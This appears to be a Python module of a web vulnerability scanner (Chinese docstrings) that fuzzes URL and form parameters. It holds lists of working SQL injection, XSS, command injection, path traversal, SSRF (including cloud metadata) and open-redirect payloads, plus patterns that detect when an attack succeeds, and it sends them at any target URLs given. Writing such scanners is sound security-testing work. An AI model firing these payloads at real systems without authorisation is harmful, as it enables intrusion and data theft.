"""参数 Fuzz 引擎。

对 URL 查询参数、表单字段、路径参数执行定向变异测试，
提升注入类漏洞的检出率与置信度。
"""

from __future__ import annotations

import asyncio
import hashlib
import re
from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse

import httpx


@dataclass
class FuzzResult:
    """单次 fuzz 测试结果。"""

    parameter: str
    payload: str
    technique: str
    response_snippet: str = ""
    status_code: int = 0
    response_length: int = 0
    evidence_type: str = ""  # e.g. sql_error, xss_reflected, cmd_output
    confidence: str = "low"


# 按漏洞类型组织的 payload 字典
FUZZ_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        '" OR "1"="1',
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "1 ORDER BY 100 --",
        "1 UNION SELECT null,null --",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
    ],
    "cmdi": [
        ";id",
        "|id",
        ";cat /etc/passwd",
        "|whoami",
        "$(whoami)",
        "`id`",
    ],
    "traversal": [
        "../etc/passwd",
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/",
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "http://evil.com",
    ],
}

# 证据识别模式
EVIDENCE_PATTERNS: dict[str, list[tuple[str, str]]] = {
    "sqli": [
        (
            "sql_error",
            r"(sql syntax|mysql_fetch|unclosed quotation|incorrect syntax|ora-\d+|pl/sql)",
        ),
        ("db_error", r"(warning:\s+mysql|fatal error|pg_query|sqlite_query)"),
    ],
    "xss": [
        ("xss_reflected", r"<script>\s*alert\(1\)</script>"),
        ("xss_event", r"(onerror\s*=\s*alert|onload\s*=\s*alert|<svg\s+onload)"),
    ],
    "cmdi": [
        ("cmd_output", r"(uid=\d+|gid=\d+|groups=\d+|root:.*:0:0)"),
    ],
    "traversal": [
        ("passwd_content", r"root:.*:0:0:"),
        ("win_ini", r"\[fonts\]|\[extensions\]"),
    ],
    "ssrf": [
        ("metadata", r"(instance-id|ami-id|local-hostname)"),
        ("internal_response", r"(127\.0\.0\.1|localhost|internal server)"),
    ],
}


def _extract_params(
    url: str, body: str = "", content_type: str = ""
) -> dict[str, list[str]]:
    """从 URL 和 body 中提取参数。"""
    params: dict[str, list[str]] = {}
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    for k, v in qs.items():
        params.setdefault(k, []).extend(v)

    if body and content_type and "application/x-www-form-urlencoded" in content_type:
        form = parse_qs(body, keep_blank_values=True)
        for k, v in form.items():
            params.setdefault(k, []).extend(v)
    return params


class FuzzEngine:
    """参数 Fuzz 引擎。"""

    def __init__(
        self,
        techniques: list[str] | None = None,
        request_timeout: float = 8.0,
        max_params: int = 15,
        follow_redirects: bool = True,
    ) -> None:
        self.techniques = techniques or [
            "sqli",
            "xss",
            "cmdi",
            "traversal",
            "ssrf",
            "open_redirect",
        ]
        self.request_timeout = request_timeout
        self.max_params = max_params
        self.follow_redirects = follow_redirects

    async def fuzz_url(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: dict[str, str] | None = None,
        body: str = "",
        content_type: str = "",
    ) -> list[FuzzResult]:
        """对单个 URL 的参数执行 fuzz。"""
        params = _extract_params(url, body, content_type)
        if not params:
            return []

        # 限制参数数量，避免请求爆炸
        param_items = list(params.items())[: self.max_params]
        results: list[FuzzResult] = []

        base_url = url.split("?")[0]
        for param_name, values in param_items:
            for technique in self.techniques:
                for payload in FUZZ_PAYLOADS.get(technique, []):
                    fuzz_url = self._build_fuzz_url(
                        base_url, params, param_name, payload
                    )
                    try:
                        resp = await client.get(
                            fuzz_url,
                            headers=headers,
                            follow_redirects=self.follow_redirects,
                            timeout=self.request_timeout,
                        )
                        snippet = resp.text[:500]
                        evidence = self._detect_evidence(technique, payload, snippet)
                        if evidence:
                            results.append(
                                FuzzResult(
                                    parameter=param_name,
                                    payload=payload,
                                    technique=technique,
                                    response_snippet=snippet,
                                    status_code=resp.status_code,
                                    response_length=len(resp.text),
                                    evidence_type=evidence,
                                    confidence="high"
                                    if evidence
                                    in ("sql_error", "cmd_output", "passwd_content")
                                    else "medium",
                                )
                            )
                    except Exception:
                        continue
        return results

    def _build_fuzz_url(
        self,
        base_url: str,
        params: dict[str, list[str]],
        target_param: str,
        payload: str,
    ) -> str:
        """构造带 payload 的 URL。"""
        new_params = {k: (v[0] if v else "") for k, v in params.items()}
        new_params[target_param] = payload
        return (
            f"{base_url}?{urlencode(new_params, safe='')}" if new_params else base_url
        )

    def _detect_evidence(self, technique: str, payload: str, response: str) -> str:
        """检测响应中是否存在利用证据。"""
        response_lower = response.lower()
        payload_lower = payload.lower()

        for evidence_type, pattern in EVIDENCE_PATTERNS.get(technique, []):
            if re.search(pattern, response_lower):
                # XSS 需要 payload 被反射
                if technique == "xss" and payload_lower not in response_lower:
                    continue
                return evidence_type
        return ""

    async def fuzz_multiple(
        self,
        urls: list[str],
        headers: dict[str, str] | None = None,
        max_concurrency: int = 5,
    ) -> dict[str, list[FuzzResult]]:
        """对多个 URL 执行 fuzz。"""
        results: dict[str, list[FuzzResult]] = {}
        semaphore = asyncio.Semaphore(max_concurrency)

        async def _fuzz_one(target: str) -> tuple[str, list[FuzzResult]]:
            async with semaphore:
                async with httpx.AsyncClient(
                    timeout=self.request_timeout + 2,
                    follow_redirects=self.follow_redirects,
                    headers=headers,
                ) as client:
                    return target, await self.fuzz_url(client, target, headers=headers)

        tasks = [_fuzz_one(u) for u in urls]
        for target, fuzz_results in await asyncio.gather(
            *tasks, return_exceptions=True
        ):
            if isinstance(fuzz_results, list) and fuzz_results:
                results[target] = fuzz_results
        return results


def fuzz_results_to_findings(
    fuzz_results: list[FuzzResult], url: str
) -> list[dict[str, Any]]:
    """将 FuzzResult 转换为 finding 字典。"""
    findings: list[dict[str, Any]] = []
    severity_map = {
        "sqli": "high",
        "xss": "medium",
        "cmdi": "high",
        "traversal": "high",
        "ssrf": "high",
        "open_redirect": "medium",
    }
    title_map = {
        "sqli": "参数 fuzz 发现 SQL 注入",
        "xss": "参数 fuzz 发现反射型 XSS",
        "cmdi": "参数 fuzz 发现命令注入",
        "traversal": "参数 fuzz 发现路径遍历",
        "ssrf": "参数 fuzz 发现 SSRF",
        "open_redirect": "参数 fuzz 发现开放重定向",
    }
    for r in fuzz_results:
        finding_id = hashlib.sha256(
            f"fuzz:{r.technique}:{url}:{r.parameter}:{r.payload}".encode()
        ).hexdigest()[:16]
        findings.append(
            {
                "id": f"FUZZ-{finding_id.upper()}",
                "type": r.technique,
                "name": title_map.get(r.technique, f"参数 fuzz 发现 {r.technique}"),
                "title": title_map.get(r.technique, f"参数 fuzz 发现 {r.technique}"),
                "severity": severity_map.get(r.technique, "medium"),
                "url": url,
                "parameter": r.parameter,
                "confidence": r.confidence,
                "evidence": {
                    "payload": r.payload,
                    "request": f"GET {url}?{r.parameter}={r.payload}",
                    "response": r.response_snippet,
                },
                "description": f"通过参数 fuzz 在 {r.parameter} 参数注入 {r.technique} payload，响应中出现 {r.evidence_type} 证据。",
                "fix_suggestion": "对用户输入进行严格校验与过滤，使用参数化查询、输出编码、白名单校验等机制。",
            }
        )
    return findings
